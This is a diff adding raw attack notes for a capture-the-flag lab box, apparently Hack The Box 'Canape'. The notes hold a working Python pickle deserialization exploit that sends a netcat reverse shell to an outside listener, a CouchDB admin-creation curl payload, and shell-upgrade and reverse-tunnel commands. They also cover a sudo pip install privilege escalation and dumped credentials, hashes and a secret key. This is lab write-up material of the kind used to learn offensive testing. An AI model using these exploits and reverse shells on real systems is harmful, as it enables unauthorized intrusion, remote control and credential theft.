@@ -1,0 +1,147 @@
+nmap scan returns:
+.git
+
+__init__.py:
+char + quote
+
+
+   if request.method == "POST":
+        try:
+            char = request.form["character"]
+            quote = request.form["quote"]
+                # TODO - Pickle into dictionary instead, `check` is ready
+                p_id = md5(char + quote).hexdigest()
+                outfile = open("/tmp/" + p_id + ".p", "wb")
+                outfile.write(char + quote)
+                outfile.close()
+
+@app.route("/check", methods=["POST"])
+def check():
+    path = "/tmp/" + request.form["id"] + ".p"
+    data = open(path, "rb").read()
+
+    if "p1" in data:
+        item = cPickle.loads(data)
+    else:
+        item = data
+
+    return "Still reviewing: " + item
+
+
+
+
+
+Working code:
+
+import cPickle
+import subprocess
+import requests
+import os
+from hashlib import md5
+
+class Exploit(object):
+def __reduce__(self):
+return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.69 4444 >/tmp/f && bart',))
+
+pickle = cPickle.dumps(Exploit())
+open("/root/foo", "wb").write(pickle)
+last = pickle[-1:]
+pickle = pickle[:-1]
+request = requests.post("http://10.10.10.70/submit", data = {'character' : pickle, 'quote' : last})
+if "Error!" in request.text:
+print("Errore")
+exit()
+else:
+print("OK")
+name = md5(pickle + last).hexdigest()
+print(name)
+request = requests.post("http://10.10.10.70/check", data = {'id' : name})
+print(request.text)
+
+
+/var/www/git contains .htaccess info:
+homer:Git Access:7818cef8b9dc50f4a70fd299314cb9eb
+
+/var/www/simpsons/ contains:
+simpsons.wsgi
+Contains:
+application.secret_key = "sjhdajkh292hdq29dhashdkjsad"
+
+
+Netstat listening:
+65535: SSH (public)
+5984: CouchDB
+5986: CouchDB
+46692: Unknown?!?
+80: HTTP (public)
+4369: Responds to telnet, no immediate actions
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+     
+
+Added git.canape.htb (see Apache config) to hosts
+
+ssh -t  git@localhost "git-receive-pack '--help'"
+
+ssh -t homer@localhost"git-receive-pack '--help'"
+^^^^ Not relevant
+
+See https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
+
+curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{
+"type": "user",
+"name": "oopsadmin",
+"roles": ["_admin"],
+"roles": [],
+"password": "password"
+}'
+
+Set up reverse SSH tunnel
+ssh -R 5984:localhost:5984 root@10.10.15.85
+https://blog.trendmicro.com/trendlabs-security-intelligence/vulnerabilities-apache-couchdb-open-door-monero-miners/
+
+https://www.octority.com/2017/05/16/from-couchdb-admin-to-remote-code-execution/
+
+Use:
+https://github.com/hayasec/couchdb_exp
+http://www.hayasec.me/2018/03/27/couchdb_exp/
+
+
+Check passwords table (FIRST ENTRY IS FOR USER HOMER ON SSH)
+
+{
+  "_id": "739c5ebdf3f7a001bebb8fc4380019e4",
+  "_rev": "2-81cf17b971d9229c54be92eeee723296",
+  "item": "ssh",
+  "password": "0B4jyA0xtytZi7esBNGp",
+  "user": ""
+}
+
+{
+  "_id": "739c5ebdf3f7a001bebb8fc43800368d",
+  "_rev": "2-43f8db6aa3b51643c9a0e21cacd92c6e",
+  "item": "couchdb",
+  "password": "r3lax0Nth3C0UCH",
+  "user": "couchy"{
+  "_id": "739c5ebdf3f7a001bebb8fc438004738",
+  "_rev": "1-49a20010e64044ee7571b8c1b902cf8c",
+  "user": "homerj0121",
+  "item": "github",
+  "password": "STOP STORING YOUR PASSWORDS HERE -Admin"
+}
+}
+
+{
+  "_id": "739c5ebdf3f7a001bebb8fc438003e5f",
+  "_rev": "1-77cd0af093b96943ecb42c2e5358fe61",
+  "item": "simpsonsfanclub.com",
+  "password": "h02ddjdj2k2k2",
+  "user": "homer"
+}
+
+For root: sudo -l shows pip install can be executed
+Created rev shell called setup.py
+Run sudo pip install -e . setup.py
+
+Summary: Get shell through pickle exploit (exp.py), create new couchdb admin user, extract db password table, ssh and run sudo pip install with rev shell for root
